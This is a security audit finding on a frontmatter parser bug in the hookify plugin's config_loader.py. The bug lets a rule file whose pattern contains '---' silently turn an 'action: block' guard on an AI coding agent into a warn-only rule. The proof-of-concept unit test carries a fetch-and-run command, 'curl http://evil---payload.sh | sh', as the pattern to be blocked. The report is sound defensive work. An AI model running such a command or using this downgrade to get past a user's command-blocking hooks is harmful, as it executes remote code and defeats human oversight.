### Title
Frontmatter delimiter parser truncates on embedded '---' substrings, silently downgrading `action: block` rules to default `warn` - ([File: plugins/hookify/core/config_loader.py])

### Summary
`extract_frontmatter` splits the raw file content on the literal substring `---` using `content.split('---', 2)` with no awareness of quoting, YAML block scalars, or values that legitimately contain `---`. If a rule author's `pattern`/`message` value contains `---` before the closing frontmatter fence, the split occurs early, and every key that appears after that point (e.g. `action: block`) is pushed into the "message" half instead of the parsed frontmatter dict. Because `Rule.from_dict` defaults `action` to `"warn"` when the key is absent, a rule that visually reads `action: block` in the raw file is silently loaded as a non-blocking warn-only rule, with no error or warning emitted.

### Finding Description
`load_rule_file` reads the raw file and calls `extract_frontmatter(content)`, which does: [1](#0-0) 
The split is purely textual and maxsplit-limited to 2, so it only correctly separates fences when `---` never appears inside a frontmatter value. If a crafted rule file has a field whose value contains `---` (e.g. a `pattern` used to detect a dangerous download-and-execute or `rm --preserve-root` style command, which naturally contains multiple dashes), the second `---` found by `split` may be inside that value rather than the actual closing fence. Everything positioned after that point — including a later `action: block` line — ends up in `parts[2]` (the "message" body) rather than in `frontmatter_text` (`parts[1]`), so it never reaches the line-based key/value parser at lines 106-193.

`Rule.from_dict` then builds the rule using `.get()` defaults: [2](#0-1) 
Since `action` defaults to `"warn"` and `enabled` defaults to `True`, dropping the `action` key from the truncated frontmatter causes the rule to load successfully (frontmatter dict is non-empty, so the "missing frontmatter" warning at line 257 does not fire) but as a warn-only rule instead of a blocking rule. No exception is raised, no warning is printed — the downgrade is completely silent.

The existing exception handling in `load_rule_file` only guards against I/O errors, decode errors, and structural exceptions; it does not validate that all expected fields survived the split, so this class of parser differential is unguarded: [3](#0-2) 

### Impact Explanation
This breaks the "deny means deny" invariant: a rule that is supposed to block a dangerous bash/file operation (visually and semantically expressing `action: block`) is loaded and enforced as `action: warn`, meaning the corresponding hook will not actually block the dangerous command — it will merely warn (or, depending on the hook's warn-handling, do nothing that stops execution). This is a silent guard/hook bypass for bash or file operations that a defender explicitly intended to be blocking, matching the "hook enforcement" and "unauthorized command or file action" impact categories.

### Likelihood Explanation
Preconditions are attacker (or otherwise untrusted) control of the content of a `.claude/hookify.*.local.md` file, as stated in the question's preconditions (e.g. a rule file shipped in a cloned/untrusted repository). No privilege escalation, admin rights, or leaked credentials are required — only the ability to place or edit this markdown file, which is a normal repository-content scenario. Crafting a pattern value containing `---` (a very plausible substring for security-relevant regexes such as those matching multiple flags, download markers, or horizontal-rule-like separators) is trivial and repeatable; the bug is deterministic given `content.split('---', 2)`'s behavior.

### Recommendation
Replace the substring-based frontmatter split with a delimiter-aware parser that only recognizes `---` as a fence when it appears alone on its own line (e.g. `re.split(r'(?m)^---\s*$', content, maxsplit=2)` or use a proper YAML parser like `yaml.safe_load_all`/`PyYAML` front-matter library). Additionally, after parsing, validate that all keys found in the raw frontmatter text block were actually captured (or fail closed / reject the rule) rather than silently defaulting a missing `action` to `warn`.

### Proof of Concept
Unit test to add near existing tests for `extract_frontmatter`:
```python
def test_embedded_dashes_do_not_drop_block_action():
    content = """---
name: block-dangerous
enabled: true
event: bash
pattern: "curl http://evil---payload.sh | sh"
action: block
---

This command is blocked.
"""
    frontmatter, message = extract_frontmatter(content)
    rule = Rule.from_dict(frontmatter, message)
    assert rule.action == "block"  # FAILS: actually becomes "warn" because
                                    # split('---', 2) treats the '---' inside
                                    # the pattern value as the closing fence.
```
Expected/actual divergence: `rule.action` should be `"block"` per the human-readable file content, but the naive split causes `action: block` to land in the message body, so `frontmatter.get('action', 'warn')` returns `"warn"`. A differential fuzz harness comparing `extract_frontmatter` against `yaml.safe_load` on the `frontmatter_text` segment (delimited by a proper `^---$` regex) over generated strings containing embedded `---` inside quoted values would repeatably surface this divergence and confirm `action`/`enabled` key loss.
